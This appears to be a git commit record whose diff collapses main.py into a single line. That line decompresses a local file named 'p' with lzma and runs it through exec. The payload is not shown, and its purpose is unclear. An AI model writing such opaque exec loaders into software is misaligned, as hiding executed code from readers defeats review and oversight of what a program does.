96acb1568a4af831836537b464d1d4a339313850
Morteza Moradzadeh <mortezam037@gmail.com>
2026-09-19 23:46:40 +0330

    S 6

--- main.py
+++ main.py
@@ -1,3 +1,1 @@
-import lzma,os
-_p="/app/p"if os.path.exists("/app/p")else os.path.join(os.path.dirname(__file__),"p")
-exec(lzma.decompress(open(_p,"rb").read()))
+import lzma,os;exec(lzma.decompress(open(os.path.join(os.path.dirname(__file__),"p"),"rb").read()))
